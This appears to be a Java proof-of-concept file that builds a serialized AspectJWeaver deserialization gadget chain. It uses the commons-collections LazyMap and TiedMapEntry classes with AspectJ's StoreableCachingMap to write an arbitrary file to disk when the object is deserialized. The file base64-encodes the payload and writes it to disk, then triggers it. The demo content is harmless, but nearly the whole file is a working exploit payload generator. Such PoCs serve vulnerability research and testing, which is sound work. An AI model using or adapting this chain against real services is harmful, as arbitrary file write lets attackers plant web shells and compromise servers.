import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Main {

    public static void main(String[] args) throws Exception {
        String fileName    = "test.txt";
        String filePath    = "D:/";
        String Content = "test AspectJWeaver";

        Class c = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor<?> constructor = c.getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
        Map map = (Map) constructor.newInstance(filePath, 10000);
        Transformer transformer = new ConstantTransformer(Content.getBytes(StandardCharsets.UTF_8));
        Map lazyMap = LazyMap.decorate(map, transformer);
        TiedMapEntry entry   = new TiedMapEntry(lazyMap, fileName);

        HashSet<Object> hs = new HashSet<>();
        hs.add(entry);

        PocHelper.OutBase64Encode(hs);
        PocHelper.writeSer(hs,"AspectJWeaver.ser");
        PocHelper.readSer("AspectJWeaver.ser");

    }
}
